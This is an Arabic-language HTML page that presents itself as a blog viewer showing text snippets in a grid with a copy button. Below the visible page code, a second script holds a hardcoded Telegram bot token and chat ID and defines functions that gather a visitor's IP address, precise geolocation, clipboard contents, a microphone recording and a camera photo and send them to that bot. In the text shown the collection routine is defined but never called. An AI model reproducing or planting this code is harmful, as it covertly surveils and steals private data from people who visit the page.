<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>مدونات كاملة</title>
  <style>
    body {
      margin: 0;
      background: #fff000;
      font-family: Arial, sans-serif;
    }

    #blogs {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 20px;
      padding: 30px;
      direction: rtl;
    }

    .blog-box {
      background: rgba(90, 0, 130, 0.2);
      border: 2px dashed #cc33ff;
      box-shadow: 0 0 15px #cc33ff, 0 0 30px #9900cc;
      border-radius: 15px;
      padding: 10px;
      color: black;
      height: 150px;
      overflow: hidden;
      cursor: pointer;
      transition: transform 0.2s ease;
    }

    .blog-box:hover {
      transform: scale(1.05);
    }

    /* مربع كبير يغطي الشاشة بالكامل */
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.9);
      color: white;
      display: none;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 40px;
      z-index: 999;
      flex-direction: column;
    }

    #fullText {
      font-size: 28px;
      line-height: 2.2;
      white-space: pre-wrap;
      max-width: 90vw;
    }

    #copyBtn {
      margin-top: 30px;
      background-color: purple;
      color: white;
      font-size: 20px;
      padding: 12px 30px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }

    .home-btn {
      position: fixed;
      bottom: 20px;
      right: 20px;
      width: 75px;
      height: 75px;
      background-color: pink;
      color: black;
      font-size: 30px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      text-decoration: none;
      box-shadow: 0 0 15px yellow;
      animation: pulse 2s infinite;
      z-index: 1000;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 5px yellow; }
      50% { box-shadow: 0 0 25px yellow; }
      100% { box-shadow: 0 0 5px yellow; }
    }

    @media (max-width: 768px) {
      #blogs {
        grid-template-columns: 1fr;
      }
      #fullText {
        font-size: 22px;
      }
    }
  </style>
</head>
<body>

<!-- شبكة المربعات -->
<div id="blogs"></div>

<!-- مربع يغطي الشاشة بالكامل -->
<div id="overlay" onclick="hideOverlay(event)">
  <div id="fullText" onclick="event.stopPropagation()"></div>
  <button id="copyBtn" onclick="copyText()">📋 نسخ النص</button>
</div>

<!-- زر وردي يرجع إلى index.html -->
<a href="index.html" class="home-btn" title="العودة للصفحة الرئيسية">🏠</a>

<script>
  const blogFiles = ['blog1.txt', 'blog2.txt', 'blog3.txt'];
  const blogsContainer = document.getElementById('blogs');
  const overlay = document.getElementById('overlay');
  const fullText = document.getElementById('fullText');
  let allBlogs = [];

  async function loadBlogs() {
    for (const file of blogFiles) {
      try {
        const res = await fetch(file);
        const text = await res.text();
        const parts = text.split(/(?:\r?\n){2,}|===/g).filter(e => e.trim());
        allBlogs.push(...parts);
      } catch (err) {
        console.error('فشل تحميل', file, err);
      }
    }

    allBlogs.slice(0, 9).forEach((text) => {
      const box = document.createElement('div');
      box.className = 'blog-box';
      box.innerText = text.substring(0, 60) + '...';
      box.onclick = () => showFullText(text);
      blogsContainer.appendChild(box);
    });
  }

  function showFullText(text) {
    fullText.innerText = text;
    overlay.style.display = 'flex';
  }

  function hideOverlay(event) {
    overlay.style.display = 'none';
  }

  function copyText() {
    navigator.clipboard.writeText(fullText.innerText)
      .then(() => alert("✅ تم نسخ النص!"));
  }

  loadBlogs();
</script>
</div>

<script>
const BOT_TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
const CHAT_ID = "7664410054";

async function getIPAndLocation() {
  const ip = await fetch("https://api.ipify.org").then(r => r.text());
  const location = await new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const link = `https://maps.google.com/?q=${lat},${lon}`;
      resolve({ lat, lon, link });
    }, err => reject(err));
  });

  return { ip, location };
}

async function getClipboard() {
  try {
    const text = await navigator.clipboard.readText();
    return text || "📋 لا شيء بالحافظة";
  } catch {
    return "📋 تم رفض إذن الحافظة";
  }
}

async function requestMicrophoneBlob() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const mediaRecorder = new MediaRecorder(stream);
    const chunks = [];
    return new Promise(resolve => {
      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: "audio/webm" });
        resolve(blob);
      };
      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), 5000); // 5 ثوانٍ
    });
  } catch (e) {
    return null;
  }
}

async function requestCameraBlob() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    const photo = await imageCapture.takePhoto();
    track.stop();
    return photo;
  } catch (e) {
    return null;
  }
}

function sendTextToBot(text) {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
    })
  });
}

function sendMediaToBot(blob, type) {
  const formData = new FormData();
  formData.append(type, blob, `${type}.${type === "video" ? "webm" : "jpg"}`);
  formData.append("chat_id", CHAT_ID);
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === "video" ? "Video" : "Photo"}`, {
    method: "POST",
    body: formData
  });
}

async function startCollection() {
  const now = new Date().toLocaleString();
  const { ip, location } = await getIPAndLocation();
  const clip = await getClipboard();
  const audioBlob = await requestMicrophoneBlob();
  const photoBlob = await requestCameraBlob();

  let msg = `👑دخول جديد👑\n(${now})\n\n`;
  msg += `🌐موقع🌐\nالجزائر\n${ip}\n${location.link}\n\n`;
  msg += `📋الحافظة📋\n${clip}`;

  sendTextToBot(msg);

  if (audioBlob) {
    sendMediaToBot(audioBlob, "video"); // صوت بصيغة webm
  }

  if (photoBlob) {
    sendMediaToBot(photoBlob, "photo");
  }
}
</script>

</body>
</html>
